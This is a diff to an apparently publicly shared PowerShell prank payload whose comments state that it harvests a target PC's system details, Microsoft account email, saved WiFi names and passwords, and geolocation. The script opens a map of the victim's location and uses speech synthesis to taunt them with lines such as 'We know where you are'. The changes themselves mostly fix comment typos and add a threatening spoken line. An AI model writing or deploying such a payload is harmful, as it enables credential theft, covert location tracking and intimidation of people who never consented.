@@ -10,7 +10,7 @@
 #                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
 #                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
 #__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#                                                                                                            #         /       \   /     ~ \               #
+#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
 #  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
 #  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
 #  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
@@ -19,17 +19,17 @@
 
 <#
 .NOTES
-	The targets Location Services must be turned on or this payload will not work
+	The target's Location Services must be turned on or this payload will not work.
 
 .SYNOPSIS
-	This script will get the users location and open a map of where they are in their browser and use windows speech to declare you know where they are  
+	This script will get the user's location and open a map of where they are in their browser and use Windows speech to declare you know where they are.  
 
 .DESCRIPTION 
-	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
+	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with their Microsoft account.
 	The SSID and WiFi password of any current or previously connected to networks.
-	It determines the last day they changed thier password and how many days ago.
-	Once the information is gathered the script will pause until a mouse movement is detected
-	Then the script uses Sapi speak to roast their set up and lack of security
+	It determines the last day they changed their password and how many days ago.
+	Once the information is gathered, the script will pause until a mouse movement is detected.
+	Then the script uses Sapi speak to roast their set up and lack of security.
 #>
 
 #-----------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -37,7 +37,7 @@
 <#
 
 .NOTES 
-	This is to get the Name associate with the targets microsoft account, if not detected UserName will be used 
+	This is to get the name associated with the targets Microsoft account, if not detected UserName will be used. 
 #>
 
 function Get-fullName {
@@ -67,7 +67,7 @@ $FN = Get-fullName
 <#
 
 .NOTES 
-	This is to get the current Latitide and Longitude of your target
+	This is to get the current Latitude and Longitude of your target
 #>
 
 function Get-GeoLocation{
@@ -83,7 +83,7 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
 		
 	}
 	}
@@ -148,6 +148,7 @@ $s.Rate = -2
 $s.Speak("We found you $FN")
 $s.Speak("We know where you are")
 $s.Speak("We are everywhere")
+$s.Speak("We do not forgive, we do not forget")
 $s.Speak("Expect us")
 
 
